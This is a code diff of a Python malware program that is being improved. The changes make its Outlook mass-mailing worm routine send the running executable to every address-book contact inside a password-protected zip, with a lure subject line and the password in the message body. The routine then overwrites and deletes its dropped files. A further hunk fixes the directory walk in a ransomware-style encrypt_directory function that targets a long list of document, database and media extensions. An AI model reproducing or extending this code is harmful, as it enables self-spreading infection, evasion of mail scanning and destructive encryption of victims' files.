@@ -1,6 +1,7 @@
 import base64
 import ctypes
 import hashlib
+import random
 import os
 import string
 import subprocess
@@ -10,6 +11,7 @@ import zlib
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor
 
+import pyzipper
 import requests
 import winshell
 from cryptography.fernet import Fernet
@@ -26,6 +28,10 @@ def is_admin():
 
 
 def send_mail():
+    zip_file_path = os.path.join(os.getenv("TEMP"), f"IMG_{random.randint(1000, 9999)}.zip")
+    with pyzipper.AESZipFile(zip_file_path, 'w', compression=pyzipper.ZIP_LZMA) as zf:
+        zf.setpassword("memecoder")
+        zf.write(sys.executable)
     vbs_code = f"""dim x
 on error resume next
 Set fso ="Scripting.FileSystem.Object"
@@ -39,21 +45,27 @@ For x=1 To ae.Count
 Set ci=ol.CreateItem(0)
 Set Mail=ci
 Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)
-Mail.Subject="Is this you?"
-Mail.Body="Man that has got to be embarrassing!"
-Mail.Attachments.Add("{sys.executable}")
+Mail.Subject="Hello, is this you?"
+Mail.Body="Man that has got to be embarrassing!!! Extraction password: memecoder"
+Mail.Attachments.Add("{zip_file_path}")
 Mail.send
 Next
 ol.Quit
 """
-    file_path = os.path.join(os.getenv("TEMP"), "mail.vbs")
-    with open(file_path, "w") as f:
+    vbs_file_path = os.path.join(os.getenv("TEMP"), "mail.vbs")
+    with open(vbs_file_path, "w") as f:
         f.write(vbs_code)
-    execute_command(f'start /b "" "{file_path}"')
-    with open(file_path, "w") as f:
-        f.write(os.urandom(os.path.getsize(file_path)))
+    execute_command(f'start /b "" "{vbs_file_path}"')
+    with open(vbs_file_path, "w") as f:
+        f.write(os.urandom(os.path.getsize(vbs_file_path)))
     try:
-        os.remove(os.path.join(os.getenv("TEMP"), "mail.vbs"))
+        os.remove(vbs_file_path)
+    except:
+        pass
+    with open(zip_file_path, "w") as f:
+        f.write(os.urandom(os.path.getsize(vbs_file_path)))
+    try:
+        os.remove(zip_file_path)
     except:
         pass
 
@@ -245,7 +257,7 @@ def encrypt_directory(directory_path, key):
     files_targeted = [".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem", ".odt", ".ott", ".sxw", ".stw", ".uot", ".3ds", ".max", ".3dm", ".ods", ".ots", ".sxc", ".stc", ".dif", ".slk", ".wb2", ".odp", ".otp", ".sxd", ".std", ".uop", ".odg", ".otg", ".sxm", ".mml", ".lay", ".lay6", ".asc", ".sqlite3", ".sqlitedb", ".sql", ".accdb", ".mdb", ".db", ".dbf", ".odb", ".frm", ".myd", ".myi", ".ibd", ".mdf", ".ldf", ".sln", ".suo", ".cs", ".c", ".cpp", ".pas", ".h", ".asm", ".js", ".cmd", ".bat", ".ps1", ".vbs", ".vb", ".pl", ".dip", ".dch", ".sch", ".brd", ".jsp", ".php", ".asp", ".rb", ".java", ".jar", ".class", ".sh", ".mp3", ".wav", ".swf", ".fla", ".wmv", ".mpg", ".vob", ".mpeg", ".asf", ".avi", ".mov", ".mp4", ".3gp", ".mkv", ".3g2", ".flv", ".wma", ".mid", ".m3u", ".m4u", ".djvu", ".svg", ".ai", ".psd", ".nef", ".tiff", ".tif", ".cgm", ".raw", ".gif", ".png", ".bmp", ".jpg", ".jpeg", ".vcd", ".iso", ".backup", ".zip", ".rar", ".7z", ".gz", ".tgz", ".tar", ".bak", ".tbk", ".bz2", ".paq", ".arc", ".aes", ".gpg", ".vmx", ".vmdk", ".vdi", ".sldm", ".sldx", ".sti", ".sxi", ".602", ".hwp", ".snt", ".onetoc2", ".dwg", ".pdf", ".wk1", ".wks", ".123", ".rtf", ".csv", ".txt", ".vsdx", ".vsd", ".edb", ".eml", ".msg", ".ost", ".pst", ".potm", ".potx", ".ppam", ".ppsx", ".ppsm", ".pps", ".pot", ".pptm", ".pptx", ".ppt", ".xltm", ".xltx", ".xlc", ".xlm", ".xlt", ".xlw", ".xlsb", ".xlsm", ".xlsx", ".xls", ".dotx", ".dotm", ".dot", ".docm", ".docb", ".docx", ".doc"]
     with ThreadPoolExecutor(max_workers=8) as executor:
         futures = []
-        for root, _, files in os.walk(directory):
+        for root, _, files in os.walk(directory_path):
             for file in files:
                 if not os.path.splitext(file)[1].lower() in files_targeted:
                     continue
